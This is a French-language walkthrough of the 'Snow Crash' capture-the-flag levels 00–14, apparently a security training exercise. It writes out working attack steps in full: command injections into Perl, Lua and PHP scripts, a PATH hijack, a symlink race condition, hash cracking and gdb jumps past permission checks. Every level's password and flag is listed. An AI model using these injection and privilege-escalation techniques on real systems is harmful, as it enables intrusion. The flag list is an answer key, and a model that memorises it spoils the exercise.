# Snow Crash — Résumé des levels

## Outils pour sonder les levels

| Commande | Usage |
|---|---|
| `whoami` | Vérifier l'utilisateur courant |
| `pwd && ls -la` | Lister les fichiers du level |
| `find / -user flagXX 2>/dev/null` | Chercher les fichiers appartenant à flagXX |
| `find / -perm -4000 2>/dev/null` | Chercher les binaires SUID (4000 = bit SUID) |
| `cat /etc/crontab && ls -la /etc/cron.d/` | Inspecter les tâches cron |
| `ps aux` | Lister les processus |
| `ss -tlnp` ou `netstat -tlnp` | Lister les ports en écoute |
| `nc -l` / `nc -lv <port>` | Écouter sur un port |

### Le bit SUID

Un programme avec SUID s'exécute avec les droits de son **propriétaire**, pas forcément ceux de la personne qui l'exécute. `-rwsr-xr-x` : le `s` à la place du `x` signifie que le bit est activé → le prog s'exécute en root.
`find / -perm -4000` : tous les bits de permission du mode doivent être positionnés ; 4000 = bit SUID.

### Analyse d'un binaire

| Commande | Question à laquelle elle répond |
|---|---|
| `file` | Qu'est-ce que ce fichier ? |
| `strings` | Quelles chaînes lisibles sont cachées ? |
| `objdump` / `gdb` | Quelles instructions asm contient-il ? |

## Types de vulnérabilités

- **Script** → lire le code source
- **Binaire** → `file` / `strings` / `ltrace` → `gdb` ou Ghidra
- **Réseau** → checker le protocole et tester des injections → `nc localhost <port>`
- **Capture** → PCAP → WireShark pour scruter les échanges

## Familles de failles

| Faille | Principe |
|---|---|
| Permissions | fichier world-writable / SUID mal placé |
| Injections | `` :id `` / `$(id)` / `\| id` |
| Compare / secret en clair | mot de passe visible via `ltrace` |
| Race condition | le prog check puis utilise le fichier |
| Path hijacking | appel d'une commande sans chemin absolu |
| Faille crypto | hash cassable |
| Crontab / service | exécute en root un fichier |
| Buffer overflow / format string | — |

## Failles réseau

- **Sniffing passif** → protocole en clair, données non chiffrées, ids et données brutes ; n'importe qui interceptant le trafic peut lire.
- **Spoofing** (usurpation d'identité) :
  - **ARP** → répondre aux requêtes ARP en se faisant passer pour la passerelle ; le trafic de la victime transite vers nous.
  - **DNS** → répondre plus vite que le serveur DNS pour rediriger un domaine vers une IP contrôlée.
  - **IP** → falsifier l'adresse source d'un paquet.
- **Hijacking** → vol d'un cookie ou d'un token pour s'insérer dans une connexion.
- **TOCTOU** → *Time Of Check To Time Of Use* : vérifie une ressource à T1 puis l'utilise à T2 ; la ressource peut avoir changé entre-temps.

## Méthodologie

```
[Observer la machine]
        │
        ▼
[Identifier une anomalie]
        │
        ▼
[Comprendre la vulnérabilité]
        │
        ▼
[Exploiter la vulnérabilité]
```

## Rappel : cycle habituel

```
$ su flagXX
Password:
Don't forget to launch getflag!
$ getflag
Check flag. Here is your token: ????????????????
$ su levelXX
Password:
```

---

## Level 00 — Cipher César

```bash
find / -user flag00 2>/dev/null
# /usr/sbin/john
cat /usr/sbin/john
# cdiiddwpgswtgt
```

Chiffre de César (ROT15).

- **Password** : `nottoohardhere`
- **Flag** : `x24ti5gi3x0ol2eh4esiuxias`

---

## Level 01 — Hash DES cassable

```bash
cat /etc/passwd | grep flag01
# flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

Format `/etc/passwd` : `nom : mot_de_passe : UID : GID : commentaire : home : shell`.
Un `x` à la place du mot de passe signifie que le hash est stocké ailleurs → `/etc/shadow` (pas les perms).

`42hDRfypTqqnw` → Hash Analyser : DES ou 3DES, 13 caractères. Cassage avec Hashcat :

```bash
hashcat -m 1500 -a 0 pass rockyou.txt
# 1500 => DES, rockyou.txt => wordlist des mdp faibles
# 42hDRfypTqqnw:abcdefg
```

- **Password** : `abcdefg`
- **Flag** : `f2av5il02puano7naaf6adaaf`

---

## Level 02 — Capture PCAP (TELNET)

Fichier `level02.pcap` (`----r--r-- 1 flag02 level02`) → WireShark, clic droit → Follow → TCP Stream. `scp` pour copier le fichier hors de la VM.

Particularité TELNET : chaque caractère est tapé et envoyé individuellement ; la capture contient à la fois l'input et l'écho serveur (caractères dupliqués).

Flux reconstitué : login `levelX`, password `ft_wandr...NDRel.L0L` — les `.` sont des caractères ASCII non imprimables.

Analyse hexdump : `7F` = DEL (suppression du caractère précédent), `0D` = CR. Le password tapé subit des corrections.

- **Password** : `ft_waNDReL0L`
- **Flag** : `kooda2puivaav1idi4f57q8iq`

---

## Level 03 — Path hijacking

Binaire SUID/SGID. `./level03` → `Exploit me`. `strings` révèle : `/usr/bin/env echo Exploit me` → `env` utilise `$PATH` pour trouver `echo`.

Exploitation :

```bash
cd /tmp && touch echo && chmod +x echo   # 1. faux echo exécutable
export PATH=/tmp:$PATH                   # 2. /tmp en 1ère position dans $PATH
# 3. dans le faux echo :
#!/bin/sh
getflag
```

- **Password** : *(aucun — getflag direct)*
- **Flag** : `qi0maab88jeaj46qoumi7maus`

---

## Level 04 — Injection via CGI Perl

Script SUID `level04.pl` (serveur sur `localhost:4747`) :

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;   # backticks = exécution shell
}
x(param("x"));
```

La valeur du paramètre HTTP `x` est injectée dans un `echo`. Le `;` ne passe pas tel quel dans l'URL → encodage `%3B`.

```bash
curl "http://localhost:4747/level04.pl?x=test%3Bgetflag"
```

- **Password** : *(aucun)*
- **Flag** : `ne2searoevaevoem4ov4ar8ap`

---

## Level 05 — Cron + sous-shell isolé

`find / -user flag05` → `/usr/sbin/openarenaserver`, script shell SUID exécuté par cron :

```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")   # sous-shell isolé
        rm -f "$i"
done
```

Le sous-shell est une copie du shell parent. Objectif : pousser cron à exécuter `getflag` avec les privilèges de flag05.

`script.sh` déposé dans `/opt/openarenaserver/` :

```sh
#!/bin/sh
id > /tmp/here.txt
getflag > /tmp/fag.txt
```

Attente : `watch -n 1 'ls -la /opt/openarenaserver/'` (un cron tourne bien, process root).

- **Password** : *(aucun)*
- **Flag** : `viuaaale9huek52boumoomioc`

---

## Level 06 — `preg_replace` avec modificateur `/e` (PHP)

Binaire SUID qui exécute `level06.php` (PHP 5.3.10) :

```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
```

⚠️ Le modificateur `\e` (deprecated) évalue le résultat de la substitution comme du code PHP. Le pattern `/(\[x (.*)\])/e` capture `[x ...]` et exécute `y("...")` comme code PHP.

Fichier `/tmp/test.txt` contenant :

```
[x ${`getflag`} ]
```

```bash
./level06 /tmp/test.txt
```

- **Password** : *(aucun)*
- **Flag** : `wiok45aaoguiboiki2tuin6ub`

---

## Level 07 — Injection via variable d'environnement

Binaire SUID. `strings` révèle : `LOGNAME` et `/bin/echo %s`. L'exec utilise une variable d'environnement modifiable :

```bash
export LOGNAME='$(getflag)'
./level07
```

- **Password** : *(aucun)*
- **Flag** : `fiumuikeil55xe9cu4dood66h`

---

## Level 08 — Symlink pour contourner un filtre de nom

Binaire SUID qui lit un fichier mais refuse celui nommé `token` (`You may not access '%s'`). La comparaison porte sur le **nom** du fichier ; impossible de renommer l'original (permissions).

Solution : lien symbolique avec un autre nom (chemin absolu obligatoire pour `ln`).

```bash
ln -s /home/user/level08/token /tmp/there
./level08 /tmp/there
```

- **Password** : `quif5eloekouj29ke0vouxean`
- **Flag** : `25749xKZ8L7DkSCwJkT9dyv6f`

---

## Level 09 — Décodage positionnel

Binaire SUID + fichier `token` binaire illisible. Le programme encode son argument : chaque caractère est additionné de sa position dans la string (`"abc"` → `ace`).

Décodage inverse du token en C :

```c
#include <stdio.h>
int main(int ac, char** av) {
    int i = 0;
    char* v = av[1];
    while (*v) {
        printf("%c", *v++ - i++);
    }
    printf("\n");
    return 0;
}
```

```bash
cd /tmp && gcc script.c && cd
cat token | xargs /tmp/a.out
```

- **Password** : `f3iji1ju5yuevaus41q1afiuq`
- **Flag** : `s5cAJpM8ev6XHw998pRWG728z`

---

## Level 10 — TOCTOU (race condition)

Binaire SUID : `./level10 file host` envoie le fichier vers `host:6969` **si on a accès** au fichier. `token` est en `rw------- flag08` → `You don't have access to token`.

`ltrace` révèle la séquence vulnérable :

```
access("/tmp/asd.txt", 4)     <- vérifie les droits (rapide)
connect(...)                  <- connexion TCP (LENT)
open(...) ; read(...)         <- ouvre et lit le fichier
```

Classique **TOCTOU** : swapper le fichier (lien symbolique) entre le `access` et le `open`.

Terminal 1 (écoute permanente) :

```bash
nc -lvk 6969     # -k garde la connexion ouverte
```

`script.sh` (boucle de swap) :

```bash
#!/bin/bash
while true; do
    ln -sf /tmp/asd.txt /tmp/sad.txt &>/dev/null
    ln -sf /home/user/level10/token /tmp/sad.txt &>/dev/null
done &
SWITCH_PID=$!
```

`ex.sh` (boucle d'exécution) :

```bash
#!/bin/bash
while true; do
    /home/user/level10/level10 /tmp/sad.txt 127.0.0.1
    sleep 0.01
done
```

Quand le timing est bon, le token (et non `salut`) transite.

- **Password** : `woupa2yuojeeaaed06riuj63c`
- **Flag** : `feulo4b72j7edeahuete3no7c`

---

## Level 11 — Injection dans `io.popen` (Lua)

Script Lua SUID, serveur sur `127.0.0.1:5151` (déjà en écoute sur la machine) :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")   -- injection ici
  ...
end
```

Le password reçu est concaténé directement dans une commande shell exécutée avec les droits du script.

```bash
nc 127.0.0.1 5151
Password: ; getflag > /tmp/asd
cat /tmp/asd
```

(Alternative : inverser le hash sha1 `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`.)

- **Password** : *(aucun)*
- **Flag** : `fa6v5ateaw21peobuub8ipe6s`

---

## Level 12 — Injection via `egrep` dans CGI Perl

Script Perl SUID, serveur sur `localhost:4646` :

```perl
$xx =~ tr/a-z/A-Z/;                    # min -> MAJ sur x
$xx =~ s/\s.*//;                       # coupe tout après un espace
@output = `egrep "^$xx" /tmp/xd 2>&1`; # x injecté dans egrep
```

Particularités : l'injection doit survivre aux regex (majuscules, pas d'espace, `/tmp/` contient un `-` bloqué → utiliser `/*/`). Le `"` ferme l'arg de `curl`, d'où le fichier :

```bash
echo "getflag > /tmp/sad" > /tmp/SAD && chmod 777 /tmp/SAD
```

⚠️ Différence `'` et `"` : avec des guillemets simples, `$(...)` n'est pas interprété par le shell local.

```bash
curl 'http://localhost:4646/level12.pl?x=;$(/*/SAD)'
cat /tmp/sad
```

- **Password** : *(aucun)*
- **Flag** : `g1qKMiRpXf53AWhDaU7FEkczr`

---

## Level 13 — Saut dans gdb pour contourner le check UID

Binaire SUID. `strings` révèle : `UID %d started us but we we expect 4242` (0x1092 = 4242) et un token crypté en dur (`ft_des`).

Le programme compare `getuid()` à 4242 avant d'appeler `ft_des`. Sous gdb, sauter par-dessus le check :

```
b *0x0804859a      <- avant le cmp
jump *0x080485cb   <- ignore tout, juste avant ft_des
continue
your token is 2A31L79asukciNyi8uppkEuSx
```

- **Password** : *(aucun)*
- **Flag** : `2A31L79asukciNyi8uppkEuSx`

---

## Level 14 — Le bon `ft_des` parmi 15

```bash
gdb -q getflag
```

Le `disas main` de `getflag` contient **15 appels** de `ft_des`. Sauter sur chacun jusqu'au bon :

```
jump *0x08048bf3   -> x24ti5gi3x0ol2eh4esiuxias  (X - flag level00)
jump *0x08048c17   -> f2av5il02puano7naaf6adaaf  (X - flag level01)
jump *0x08048c3b   -> kooda2puivaav1idi4f57q8iq  (X - flag level02)
...
jump *0x08048de5   -> 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ  ✔
```

⚠️ Les premiers flags trouvés sont ceux des levels précédents — il faut tester les 15 appels.

```bash
su flag14
# Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
```

- **Password** : *(aucun)*
- **Flag** : `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`

---

## Tableau récapitulatif

| Level | Faille | Password | Flag |
|---|---|---|---|
| 00 | Cipher César (ROT15) | `nottoohardhere` | `x24ti5gi3x0ol2eh4esiuxias` |
| 01 | Hash DES cassé (hashcat) | `abcdefg` | `f2av5il02puano7naaf6adaaf` |
| 02 | PCAP TELNET (caractères DEL) | `ft_waNDReL0L` | `kooda2puivaav1idi4f57q8iq` |
| 03 | Path hijacking | — | `qi0maab88jeaj46qoumi7maus` |
| 04 | Injection CGI Perl (encodage `%3B`) | — | `ne2searoevaevoem4ov4ar8ap` |
| 05 | Cron exécutant des scripts arbitraires | — | `viuaaale9huek52boumoomioc` |
| 06 | `preg_replace` `/e` (PHP) | — | `wiok45aaoguiboiki2tuin6ub` |
| 07 | Injection variable d'environnement | — | `fiumuikeil55xe9cu4dood66h` |
| 08 | Filtre de nom contourné par symlink | `quif5eloekouj29ke0vouxean` | `25749xKZ8L7DkSCwJkT9dyv6f` |
| 09 | Encodage positionnel | `f3iji1ju5yuevaus41q1afiuq` | `s5cAJpM8ev6XHw998pRWG728z` |
| 10 | TOCTOU (race condition) | `woupa2yuojeeaaed06riuj63c` | `feulo4b72j7edeahuete3no7c` |
| 11 | Injection dans `io.popen` (Lua) | — | `fa6v5ateaw21peobuub8ipe6s` |
| 12 | Injection `egrep` via regex Perl | — | `g1qKMiRpXf53AWhDaU7FEkczr` |
| 13 | Jump gdb (contournement check UID) | — | `2A31L79asukciNyi8uppkEuSx` |
| 14 | Bon `ft_des` parmi 15 | — | `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ` |
